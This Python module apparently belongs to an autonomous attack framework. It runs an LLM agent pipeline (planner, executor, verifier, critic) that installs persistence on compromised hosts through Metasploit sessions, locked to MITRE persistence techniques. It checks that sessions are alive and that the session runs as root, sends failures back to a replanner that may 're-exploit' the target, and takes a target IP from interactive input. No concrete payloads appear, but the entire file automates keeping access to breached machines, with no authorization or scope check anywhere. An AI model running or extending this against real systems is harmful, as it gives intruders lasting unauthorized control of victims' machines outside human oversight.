def _technique_feasibility_precheck(tech, session_id, session_type, access_level):
    """(feasible, reason). Only blocks on a CONFIRMED impossibility — never on an
    ambiguous/failed probe — so we don't wrongly skip a workable technique."""
    # Root requirement: block only if the session is CONFIRMED non-root.
    if tech.min_privilege == "root" and access_level not in ("root", "user_with_sudo"):
        if _probe_priv(session_id, session_type) == "user":
            return False, (f"{tech.name} requires root but this session is non-root "
                           f"(id shows a non-zero uid)")
    # Tooling requirement: systemd needs systemctl present on the target.
    if tech.slug == "systemd_service":
        try:
            out = msf_session.run_session_command(
                session_id, "command -v systemctl || echo NO_SYSTEMCTL", timeout=15) or ""
        except Exception:
            out = ""  # probe failed → don't block
        if out.strip() and ("NO_SYSTEMCTL" in out or "systemctl" not in out):
            return False, ("systemd is not present on this target (systemctl missing) "
                           "— cannot create a systemd service")
    return True, ""


# =============================================================================
# FINDINGS EXTRACTION
# =============================================================================

def _extract_persistence_findings(state: dict) -> PersistenceFindings:
    critic_verdict = state.get("critic_verdict", "")
    persistence_plan = state.get("persistence_plan", "")
    install_result = state.get("install_result", "")
    verification_result = state.get("verification_result", "")

    success = critic_verdict == "PASS"

    _classify = classify_technique

    # Extract method from plan text first.
    method = _classify(persistence_plan)

    # Fall back to install/verification text when the plan is empty or
    # inconclusive (e.g. executor/verifier crashed before capturing a plan).
    if method == "unknown":
        for text in (install_result, verification_result):
            method = _classify(text)
            if method != "unknown":
                break

    # Build details
    details = f"Plan: {persistence_plan[:200]}\nInstall: {install_result[:200]}\nVerify: {verification_result[:200]}"

    # Build summary — always include a non-empty reason so the orchestrator has
    # actionable failure context even when nothing was captured.
    if success:
        summary = f"Persistence established via {method}. Verified working."
    else:
        # Keep install and verify context SEPARATE and at 300 chars each so the
        # orchestrator/replanner has enough actionable detail to route around the
        # failure (the old joined 150-char truncation dropped the verify reason).
        install_ctx = (install_result or "none").strip()
        verify_ctx = (verification_result or "none").strip()
        summary = (
            f"Persistence failed after {state.get('loop_step', 0)} attempt(s). "
            f"Method: {method}. "
            f"Install: {install_ctx[:300]} "
            f"Verify: {verify_ctx[:300]}"
        )

    return PersistenceFindings(
        success=success,
        method=method,
        details=details,
        summary=summary,
    )

# =============================================================================
# ENTRY POINT
# =============================================================================

def run_persistence(
    target_ip: str,
    session_id: str,
    session_type: str,
    access_level: str,
    objective: str = "",
    technique_id: str = "",
    technique_slug: str = "",
    thread_id: str = None,
    recursion_limit: int = 250,
) -> PersistenceFindings:
    import uuid

    if thread_id is None:
        thread_id = f"persist_{uuid.uuid4().hex[:8]}"

    # Resolve the node's assigned MITRE technique against the catalog so the planner
    # is locked to it. Try each arg independently (technique_slug may carry a human
    # name that doesn't resolve, so we must still try technique_id). An
    # unresolved/empty technique falls back to legacy self-select behavior.
    assigned = (mitre.get_technique("persistence", technique_slug)
                or mitre.get_technique("persistence", technique_id))
    assigned_slug = assigned.slug if assigned else ""
    assigned_id = assigned.id if assigned else ""
    if assigned:
        print_colored(
            f"[run_persistence] Assigned technique: {assigned_id} {assigned.name} "
            f"({assigned_slug}) — locking planner to procedures under it.",
            Colors.OKCYAN,
        )

    # --- SESSION LIVENESS PROBE (before entering the graph) ---
    # A dead session causes the executor to burn all 10 tool slots receiving
    # "Error: Session X not found." on every command, then a guaranteed FAIL.
    # Probe first: substitute a live session if one exists, else abort cleanly.
    probed_id, probed_type, probe_status = _probe_session(
        target_ip, session_id, session_type
    )
    if probed_id is None:
        print_colored(
            f"[run_persistence] {probe_status} — aborting before graph entry (non-retryable).",
            Colors.FAIL,
        )
        # session_unusable => non-retryable: re-running the SAME node against the SAME
        # dead/zombie session just re-aborts (the ~35-min grind we are killing). The
        # node dies; the replanner must re-establish a session (re-exploit) to recover.
        return dict(PersistenceFindings(
            success=False,
            method="error",
            details=f"Session liveness probe: {probe_status}",
            summary=(
                f"Persistence aborted — no usable session to the target "
                f"(session {session_id}: {probe_status}). A session must be "
                f"re-established (re-exploit) before persistence can run."
            ),
        ), failure_category="session_unusable")
    if probed_id != session_id or probed_type != session_type:
        print_colored(
            f"[run_persistence] Using session {probed_id} ({probed_type}) "
            f"instead of requested {session_id} ({session_type}).",
            Colors.WARNING,
        )
    session_id, session_type = probed_id, probed_type

    # --- TECHNIQUE FEASIBILITY PRECHECK (assigned technique only) ---
    # Fail FAST if the locked technique cannot work on this target/session, so the
    # replanner grows a compatible technique instead of the subagent grinding its
    # full retry budget on a doomed install. failure_category=technique_infeasible
    # + method=<slug> lets _failed_techniques mark it TRIED for the replanner menu.
    if assigned:
        feasible, reason = _technique_feasibility_precheck(
            assigned, session_id, session_type, access_level
        )
        if not feasible:
            print_colored(
                f"[run_persistence] Technique {assigned_id} ({assigned.name}) "
                f"INFEASIBLE here: {reason} — failing fast (TECHNIQUE_EXHAUSTED) so "
                f"the replanner grows a different technique.",
                Colors.WARNING,
            )
            return dict(PersistenceFindings(
                success=False,
                method=assigned_slug,
                details=f"Technique {assigned_id} ({assigned.name}) infeasible: {reason}",
                summary=(
                    f"Persistence via {assigned.name} not applicable on this "
                    f"target/session — {reason}. TECHNIQUE_EXHAUSTED; the replanner "
                    f"should grow a different, compatible technique."
                ),
            ), failure_category="technique_infeasible", technique_exhausted=True,
               failed_technique=assigned_slug)

    workflow = build_graph()
    checkpointer = MemorySaver()
    app = workflow.compile(checkpointer=checkpointer)

    config = {
        "configurable": {"thread_id": thread_id},
        "recursion_limit": recursion_limit,
    }

    initial_state = {
        "messages": [HumanMessage(content=(
            f"Install persistence on {target_ip}.\n"
            f"Session: {session_type} (ID: {session_id})\n"
            f"Access level: {access_level}\n"
            f"Objective: {objective}"
        ))],
        "target_ip": target_ip,
        "session_id": session_id,
        "session_type": session_type,
        "access_level": access_level,
        "objective": objective,
        "assigned_technique": assigned_slug,
        "assigned_technique_id": assigned_id,
        "persistence_plan": "",
        "install_result": "",
        "verification_result": "",
        "loop_step": 0,
        "critic_verdict": "",
    }

    print_colored(f"\n{'='*60}", Colors.HEADER)
    print_colored(f"[run_persistence] Starting persistence subgraph", Colors.HEADER)
    print_colored(f"  Target: {target_ip}", Colors.HEADER)
    print_colored(f"  Session: {session_type} #{session_id}", Colors.HEADER)
    print_colored(f"  Access: {access_level}", Colors.HEADER)
    print_colored(f"  Thread: {thread_id}", Colors.HEADER)
    print_colored(f"{'='*60}\n", Colors.HEADER)

    try:
        for event in app.stream(initial_state, config=config):
            for key, value in event.items():
                if not value or "messages" not in value:
                    continue
                msgs = value["messages"]
                if not isinstance(msgs, list):
                    msgs = [msgs]
                for msg in msgs:
                    if not isinstance(msg, BaseMessage) or not msg.content:
                        continue
                    if "CRITIC FEEDBACK" in msg.content:
                        print_colored(f"\n{msg.content}", Colors.FAIL)
                    elif isinstance(msg, ToolMessage):
                        display = msg.content[:500]
                        if len(msg.content) > 500:
                            display += "... [truncated]"
                        print(f"\n[Tool Output]: {display}")
                    elif isinstance(msg, AIMessage):
                        content = msg.content
                        if "[Persistence Planner]" in content:
                            print_colored(f"\n{content[:400]}", Colors.OKBLUE)
                        elif "[Persistence Critic]" in content:
                            color = Colors.OKGREEN if "PASS" in content else Colors.FAIL
                            print_colored(f"\n{content[:400]}", color)
                        elif "[Persistence Verifier]" in content or "[Persistence Executor]" in content:
                            print_colored(f"\n{content[:400]}", Colors.WARNING)
                        else:
                            print_colored(f"\nAgent: {content[:400]}", Colors.OKGREEN)

                    if hasattr(msg, "tool_calls") and msg.tool_calls:
                        for t in msg.tool_calls:
                            print_colored(
                                f"   (Calling Tool: {t['name']} args: {str(t['args'])[:200]}...)",
                                Colors.OKCYAN
                            )
    except Exception as e:
        print_colored(f"\n[Persistence] Subgraph crashed: {e}", Colors.FAIL)
        print_colored("[Persistence] Returning graceful failure.", Colors.WARNING)
        return PersistenceFindings(
            success=False,
            method="error",
            details=f"Crash: {str(e)[:200]}",
            summary=f"Persistence crashed: {str(e)[:200]}",
        )

    final_snapshot = app.get_state(config)
    final_state = final_snapshot.values

    findings = _extract_persistence_findings(final_state)

    print_colored(f"\n{'='*60}", Colors.HEADER)
    print_colored(
        f"[run_persistence] Complete — success={findings['success']}",
        Colors.OKGREEN if findings["success"] else Colors.FAIL
    )
    print_colored(f"  {findings['summary']}", Colors.OKCYAN)
    print_colored(f"{'='*60}\n", Colors.HEADER)

    return findings

# =============================================================================
# STANDALONE MAIN
# =============================================================================

def main():
    if "--graph" in sys.argv:
        workflow = build_graph()
        app = workflow.compile()
        try:
            print(app.get_graph().draw_ascii())
        except Exception:
            graph = app.get_graph()
            print("Nodes:", [n for n in graph.nodes])
            print("Edges:", [(e.source, e.target) for e in graph.edges])
        return

    print_colored("--- Persistence Stage (Standalone) ---", Colors.OKGREEN)
    print_colored("Nodes: planner → executor → verifier → critic", Colors.OKCYAN)

    target_ip = input("\n[Target IP]: ").strip()
    session_id = input("[Session ID]: ").strip()
    session_type = input("[Session Type (command_shell/meterpreter)]: ").strip() or "command_shell"
    access_level = input("[Access Level (user/root)]: ").strip() or "user"

    findings = run_persistence(
        target_ip=target_ip,
        session_id=session_id,
        session_type=session_type,
        access_level=access_level,
    )

    print("\n" + json.dumps(dict(findings), indent=2, default=str))


if __name__ == "__main__":
    main()
